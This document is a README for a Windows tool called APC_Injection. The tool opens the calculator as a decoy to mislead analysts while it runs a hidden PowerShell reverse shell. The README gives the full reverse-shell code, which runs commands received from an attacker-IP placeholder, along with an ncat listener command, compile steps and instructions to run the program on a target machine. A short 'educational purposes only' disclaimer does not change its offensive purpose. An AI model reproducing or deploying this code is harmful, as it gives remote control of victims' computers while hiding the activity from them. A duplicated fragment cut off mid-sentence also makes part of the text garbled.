APC_Injection Program - README
Overview
The APC_Injection program is designed to perform various stealth operations using process injection techniques, including launching benign programs such as calc.exe to mislead analysts and executing a hidden reverse shell using PowerShell for remote control. The goal of this program is to appear benign while running malicious actions in the background, particularly focusing on network communication for remote command execution.

This README outlines the key functionalities of the program and how to configure and use it effectively.

Features
Launch Calculator (Calc.exe): Simulates a benign operation by launching the Windows Calculator.
Launch Reverse Shell: Uses PowerShell to establish a reverse TCP connection to a remote server, allowing the remote server to send commands and receive responses.
Stealth Execution: The reverse shell is launched in hidden mode using the powershell -NoP -NonI -W Hidden command, ensuring the command window is not visible to the user.
Modular Code: The program is organized into separate files to handle different operations, making it easy to modify or extend.
Components
The project consists of the following files:
owerShell Reverse Shell
The reverse shell is designed to connect back to a remote listener, allowing the remote machine to send commands to the compromised system. The PowerShell reverse shell is hidden and bypasses execution restrictions using -
Main.cpp: The main entry point for the program. It calls functions to either launch calc.exe or run a PowerShell reverse shell.
ShellOperations.cpp: Contains functions for launching both the calculator and the PowerShell reverse shell.
ShellOperations.h: Header file declaring the functions in ShellOperations.cpp.
Main.cpp
This file initializes the program and invokes the following key functions:

LaunchCalc() to open the calculator.
LaunchReverseShell() to start the reverse shell in a hidden PowerShell process.
ShellOperations.cpp
LaunchCalc(): This function executes calc.exe using system("calc.exe"), which is a harmless operation to distract from the actual payload.
LaunchReverseShell(): This function builds and executes a PowerShell command that creates a reverse shell back to a listener on a remote machine.
ShellOperations.h
Header file for function declarations:

cpp
Copy code
#ifndef SHELL_OPERATIONS_H
#define SHELL_OPERATIONS_H

void LaunchCalc();
void LaunchReverseShell();

#endif // SHELL_OPERATIONS_H
PowerShell Reverse Shell
The reverse shell is designed to connect back to a remote listener, allowing the remote machine to send commands to the compromised system. The PowerShell reverse shell is hidden and bypasses execution restrictions using -NoP -NonI -W Hidden -Exec Bypass.

Command Structure:

powershell
Copy code
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <attacker_port>);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i);
$sendback = (iex $data 2>&1 | Out-String);
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length);
$stream.Flush()};
$client.Close()"
Configuration
Replace <attacker_ip> with your actual IP address.
Replace <attacker_port> with the port where the listener is running (e.g., 443).
Setting Up a Listener
To receive the reverse shell connection, you must set up a listener on your machine. You can use tools such as Netcat (nc) or Ncat.

Netcat Listener Command:
bash
Copy code
ncat -lvnp 443
This sets up a listener on port 443 and will receive the incoming connection from the target machine running the reverse shell.

How to Compile and Run
Prerequisites
Windows: The program is designed for Windows systems.
MinGW/G++: Install MinGW to compile the program with G++.
Administrator Privileges: The reverse shell requires elevated privileges on the target machine.
Compilation
You can compile the program using the following command:

bash
Copy code
g++ -pipe src/Main.cpp src/ShellOperations.cpp -Iincludes -o APC_Injection.exe
Running the Program
Once compiled, run the generated APC_Injection.exe on the target machine:

bash
Copy code
APC_Injection.exe
Disclaimer
This program is intended for educational purposes only. Unauthorized use of this tool on any system without explicit permission is illegal and unethical. The developers of this tool are not responsible for any misuse.
